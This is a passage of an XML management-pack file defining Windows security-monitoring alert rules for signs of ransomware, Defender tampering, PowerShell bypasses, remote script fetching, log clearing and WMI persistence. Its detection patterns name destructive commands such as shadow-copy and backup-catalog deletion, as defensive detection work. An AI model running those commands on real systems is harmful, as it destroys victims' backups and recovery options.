            <OverrideableExe3>ReplacewithExetoOverride</OverrideableExe3>
            <OverrideableFilePath1>ReplacewithPathtoOverride</OverrideableFilePath1>
            <OverrideableFilePath2>ReplacewithPathtoOverride</OverrideableFilePath2>
            <OverrideableFilePath3>ReplacewithPathtoOverride</OverrideableFilePath3>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
              <AlertParameter5>$Data/Params/Param[14]$</AlertParameter5>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.Event.4688.GenericCryptoRansomWare" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>vssadmin delete shadows /all /quiet</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>wmic shadowcopy delete</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <And>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>bcdedit /set {default} bootstatuspolicy ignoreallfailures</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>bcdedit /set {default} recoveryenabled no</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>wbadmin delete catalog -quiet</Pattern>
                          </RegExExpression>
                        </Expression>
                      </And>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.Event.4688.GenericCryptoRansomWare.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.SecurityMonitoring.Event.GPOCreation" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.GPOMonitoring.GPOEvent.DS">
            <AGPMAccount>Thisisaplaceholder</AGPMAccount>
            <Event>5137</Event>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.SecurityMonitoring.Event.GPOCreation.AlertMessage"]$</AlertMessageId>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.GPOMonitoring.GPOEvent.DS">
            <AGPMAccount>Thisisaplaceholder</AGPMAccount>
            <Event>5141</Event>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.Event.KillWindowsDefender" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>MsMpEng</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>Stop</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>kill</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.Event.KillWindowsDefender.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.Event.ByPassExecutionPolicy" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.4688CommandAudit.DS">
            <InternalOption1>-ExecutionPolicy</InternalOption1>
            <InternalOption2>.exe</InternalOption2>
            <OverrideableFilePath1>OverrideValue</OverrideableFilePath1>
            <OverrideableFilePath2>OverrideValue</OverrideableFilePath2>
            <OverrideableFilePath3>OverrideValue</OverrideableFilePath3>
            <OverrideableFilePath4>OverrideValue</OverrideableFilePath4>
            <OverrideableFilePath5>OverrideValue</OverrideableFilePath5>
            <OverrideableFilePath6>OverrideValue</OverrideableFilePath6>
            <Switch1>UnRestricted</Switch1>
            <Switch2>Bypass</Switch2>
            <Switch3>NOTAPPLICABLETOTHISRULE</Switch3>
            <Switch4>NOTAPPLICABLETOTHISRULE</Switch4>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.Event.ByPassExecutionPolicy.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
              <AlertParameter5>$Data/Params/Param[14]$</AlertParameter5>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.Event.InvokeEncodedCommand" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.4688CommandAudit.DS">
            <InternalOption1>-Enc</InternalOption1>
            <InternalOption2>.exe</InternalOption2>
            <OverrideableFilePath1>OverrideValue</OverrideableFilePath1>
            <OverrideableFilePath2>OverrideValue</OverrideableFilePath2>
            <OverrideableFilePath3>OverrideValue</OverrideableFilePath3>
            <OverrideableFilePath4>OverrideValue</OverrideableFilePath4>
            <OverrideableFilePath5>OverrideValue</OverrideableFilePath5>
            <OverrideableFilePath6>OverrideValue</OverrideableFilePath6>
            <Switch1>-EncodedCommand</Switch1>
            <Switch2>-Enc</Switch2>
            <Switch3>.exe</Switch3>
            <Switch4>.exe</Switch4>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.Event.InvokeEncodedCommand.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
              <AlertParameter5>$Data/Params/Param[14]$</AlertParameter5>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.Event.InvokeRemoteExpression" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.4688CommandAudit.DS">
            <InternalOption1>DownloadString</InternalOption1>
            <InternalOption2>.exe</InternalOption2>
            <OverrideableFilePath1>OverrideValue</OverrideableFilePath1>
            <OverrideableFilePath2>OverrideValue</OverrideableFilePath2>
            <OverrideableFilePath3>OverrideValue</OverrideableFilePath3>
            <OverrideableFilePath4>OverrideValue</OverrideableFilePath4>
            <OverrideableFilePath5>OverrideValue</OverrideableFilePath5>
            <OverrideableFilePath6>OverrideValue</OverrideableFilePath6>
            <Switch1>https</Switch1>
            <Switch2>http</Switch2>
            <Switch3>.exe</Switch3>
            <Switch4>.exe</Switch4>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.Event.InvokeRemoteExpression.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
              <AlertParameter5>$Data/Params/Param[14]$</AlertParameter5>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.Event.PowerShellRuninMemoryOnly" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.4688CommandAudit.DS">
            <InternalOption1>-nop</InternalOption1>
            <InternalOption2>.exe</InternalOption2>
            <OverrideableFilePath1>OverrideValue</OverrideableFilePath1>
            <OverrideableFilePath2>OverrideValue</OverrideableFilePath2>
            <Switch1>-noprofile</Switch1>
            <Switch2>.exe</Switch2>
            <Switch3>.exe</Switch3>
            <Switch4>.exe</Switch4>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.Event.PowerShellRuninMemoryOnly.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
              <AlertParameter5>$Data/Params/Param[14]$</AlertParameter5>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/Params/Param[9]$</SuppressionValue>
            </Suppression>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.Event.RemoteRegSvr32" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>/i:http://</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>/i:https://</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.Event.RemoteRegSvr32.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.ScheduledTaskCreation.DS">
            <App1>OverrideValue</App1>
            <App2>OverrideValue</App2>
            <App3>OverrideValue</App3>
            <App4>OverrideValue</App4>
            <App5>OverrideValue</App5>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer.AlertMessage"]$</AlertMessageId>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.SecurityLogClearedv2" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.Modules.SecurityLogClear.DS">
            <AutoAccount>ReplaceWithAutomationAcctUserID</AutoAccount>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.SecurityLogClearedv2.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.DCServiceCreation.DS">
            <App1>OverrideValue</App1>
            <App2>OverrideValue</App2>
            <App3>OverrideValue</App3>
            <App4>OverrideValue</App4>
            <App5>OverrideValue</App5>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC.AlertMessage"]$</AlertMessageId>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.SuspiciousUserContext" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.SuspiciousUserContext.DS" />
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.SuspiciousUserContext.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
              <AlertParameter5>$Data/Params/Param[14]$</AlertParameter5>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/Params/Param[9]$</SuppressionValue>
            </Suppression>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.SystemLogClearedv2" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.Modules.SystemLogClear.DS">
            <AutoAccount>ReplaceWithAutomationAcctUserID</AutoAccount>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.SystemLogClearedv2.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.Event.WMIPersistence" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Microsoft-Windows-WMI-Activity/Operational</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">5861</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>//./root/subscription</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>CommandLineEventConsumer</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.Event.WMIPersistence.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.Event.WMIRemote.Destination" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[1]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>NETWORK</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[10]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>NULL</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>RestartHealthService.ps1</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[14]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>WmiPrvSE.exe</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.Event.WMIRemote.Destination.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/Params/Param[9]$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[11]$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.Event.WMIRemote.Source" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
